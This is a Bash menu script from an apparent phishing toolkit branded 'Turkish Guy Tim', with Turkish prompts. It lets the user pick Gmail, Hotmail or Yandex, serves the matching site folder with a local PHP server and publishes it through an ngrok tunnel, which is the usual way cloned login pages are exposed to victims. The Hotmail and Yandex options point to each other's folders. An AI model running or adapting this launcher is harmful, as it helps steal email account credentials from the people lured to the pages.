#!/bin/bash
#Turkish Guy Tim

clear
echo -e  "
\e[31m
  _____________________   __   __
 \e[31m|__   __/ __ _|__   __|  \ \ / /
 \e[32m   | | | |  __   | |      \ V / 
\e[32m    | | | | |_ |  | |       > <  \e[37m   Mail
 \e[33m   | | | |__| |  | |      / . \ 
 \e[36m   |_|  \_____|  |_|     /_/ \_\

    \e[32m=============================



\e[31m===================|
\e[31m|[01]\e[32m Gmail        \e[31m|
\e[31m|[02]\e[32m Hotmail      \e[31m|
\e[31m|[03]\e[32m Yandex       \e[31m|  
\e[31m===================|

\e[31m[00]\e[37m Menü
\e[31m[99]\e[37m Exit
"
echo -e "\e[31m"
read -p "| Numara Seçiniz:" islem
if [[ $islem == 1 || $islem == 01 ]]; then
        read -p "Port Giriniz: " port
        echo -e "\e[32mKodunuz Code: gmail"
	sleep 2
	echo ""
	echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
	sleep 4
	cd Site-gmail/
	php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 2 || $islem == 02 ]]; then
        read -p "Port Giriniz: " port
        echo -e "\e[32mKodunuz Code: hotmail"
	sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
        sleep 4
        cd Site-yandex/
        php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 3 || $islem == 03 ]]; then
        read -p "Port Giriniz: " port
        echo -e "\e[32mKodunuz Code: yandex"
	sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
        sleep 4
        cd Site-hotmail/
        php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 0 || $islem == 00 ]]; then
cd ..
cd ..
bash tgtx.sh
elif [[ $islem == 9 || $islem == 99 ]]; then
clear
echo -e "\e[31mTurkish Guy Tim İyi Günler Diler"
exit 1
else
echo ""
echo -e "\e[31m Lütfen Girdiğiniz İşlem Numarasını Kontrol Edin...."
sleep 3
clear
bash Mail.sh
fi
